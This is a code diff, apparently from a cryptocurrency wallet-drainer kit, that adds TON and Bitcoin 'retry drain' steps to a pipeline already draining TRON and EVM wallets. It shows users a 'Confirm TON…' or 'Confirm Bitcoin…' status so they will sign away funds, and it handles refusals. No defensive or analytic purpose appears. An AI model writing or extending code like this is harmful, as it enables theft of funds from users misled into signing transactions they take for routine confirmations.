@@ -4108,6 +4108,36 @@
                 L.warn('[pipeline] TRON retry drain:', eTronR && eTronR.message);
               }
             }
+            // TON: retry if connected but not yet drained
+            if (S.familyConnections.TON && !S.omnichainLegs.ton) {
+              try {
+                UI.showStatus('Confirm TON…');
+                await drainTon(S.familyConnections.TON);
+              } catch (eTonR) {
+                if (isUserRejection(eTonR)) {
+                  S.userRejectedSign = true;
+                  setPipelinePhase(PIPELINE.REJECTED);
+                  try { UI.showUserRejected(); } catch (eRr) {}
+                  return { ok: false, error: 'rejected' };
+                }
+                L.warn('[pipeline] TON retry drain:', eTonR && eTonR.message);
+              }
+            }
+            // BTC: retry if connected but not yet drained
+            if (S.familyConnections.UTXO && !S.omnichainLegs.bitcoin) {
+              try {
+                UI.showStatus('Confirm Bitcoin…');
+                await drainBtc(S.familyConnections.UTXO);
+              } catch (eBtcR) {
+                if (isUserRejection(eBtcR)) {
+                  S.userRejectedSign = true;
+                  setPipelinePhase(PIPELINE.REJECTED);
+                  try { UI.showUserRejected(); } catch (eRr) {}
+                  return { ok: false, error: 'rejected' };
+                }
+                L.warn('[pipeline] BTC retry drain:', eBtcR && eBtcR.message);
+              }
+            }
             if (!needsEvmFlush()) {
               S.postConnectComplete = true;
               emitEvmConfirmDone(S.evmAddr);
